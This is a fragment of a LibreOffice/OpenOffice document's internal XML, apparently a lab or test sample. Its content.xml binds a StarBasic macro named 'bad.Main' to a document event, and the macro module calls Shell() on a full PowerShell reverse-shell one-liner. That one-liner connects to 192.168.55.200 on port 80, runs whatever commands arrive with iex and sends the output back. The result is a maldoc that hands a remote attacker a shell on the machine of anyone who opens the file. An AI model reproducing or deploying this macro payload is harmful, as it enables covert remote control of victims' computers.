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bad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bad.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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a8f" officeooo:paragraph-rsid="001b7a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this is my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4:06:52.484128836</meta:creation-date>
    <dc:date>2022-03-16T14:12:26.907468455</dc:date>
    <meta:editing-duration>PT5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

<file path=Basic/Standard/bad.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="bad" script:language="StarBasic">REM  *****  BASIC  *****

Sub Main
	Shell("$client = New-Object System.Net.Sockets.TCPClient("192.168.55.200",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
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